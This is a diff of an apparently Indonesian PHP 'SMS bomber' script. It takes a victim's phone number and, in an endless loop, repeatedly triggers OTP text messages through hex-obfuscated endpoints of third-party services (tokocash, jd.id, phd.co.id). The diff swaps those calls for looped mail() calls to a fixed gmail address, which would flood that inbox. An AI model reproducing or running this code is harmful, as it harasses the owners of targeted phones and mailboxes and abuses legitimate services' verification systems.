@@ -120,16 +120,21 @@ if(is_numeric($argv[1])) {
 
 	echo $G."INFORMATION: SEDANG DIPROSES ".$G.$argv[1].$X."\n";
 
-	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70","msisdn=".$argv[1]."&accept=call");
-
+	
+$to_email = 'zenthicalpha2912@gmail.com';
+$subject = 'Testing PHP Mail';
+$message = 'This mail is sent using the PHP mail function';
+$headers = 'From: noreply@company.com';
+mail($to_email,$subject,$message,$headers);
 	while(1) {
 
 		echo $G."\nSUCCESSFULLY: SMS DIKIRIM KE NOMOR ".$G.$argv[1].$X."\n";	
-
-		post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73","phone=".$argv[1]."&smsType=1");
-
-		post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x68\x64\x2e\x63\x6f\x2e\x69\x64\x2f\x65\x6e\x2f\x75\x73\x65\x72\x73\x2f\x73\x65\x6e\x64\x4f\x54\x50","phone_number=".$argv[1]);
-
+		
+$to_email = 'zenthicalpha2912@gmail.com';
+$subject = 'Testing PHP Mail';
+$message = 'This mail is sent using the PHP mail function';
+$headers = 'From: noreply@company.com';
+mail($to_email,$subject,$message,$headers);
 	}
 
 }
